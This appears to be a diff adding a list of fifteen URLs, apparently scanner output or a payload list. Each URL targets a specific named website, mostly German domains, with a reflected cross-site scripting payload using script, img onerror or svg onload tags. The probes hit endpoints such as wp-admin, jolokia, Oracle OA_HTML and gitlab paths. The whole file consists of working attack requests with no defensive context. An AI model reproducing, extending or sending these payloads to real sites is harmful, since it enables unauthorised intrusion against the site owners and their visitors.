@@ -1,0 +1,15 @@
+http://alaska-rundreisen.de/wp-admin/admin.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/?page=under-construction
+http://aldeianatura.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://alem-travel.de/ics?query=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&tool=search
+http://alexander-noe.de/wp-admin/admin.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/?page=under-construction
+http://altenheime-kreis-kleve.de/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://altenheime-recklinghausen.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://altenheime-wesel-duisburg.de/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://altersgerechtigkeitsindex.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://amr.ascrionweb.de/?s=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://amshausen.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://anaqua.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://ryxxc6lb.chemkoo.com/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
+http://rz5tx.dierqi.com/OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert('2SAFeTfmOY0y9pz8IblPzpDFa7M')%3E
+http://rzaex.baehui.com/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://ryunique9.com/plugins/servlet/svnwebclient/commitGraph.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
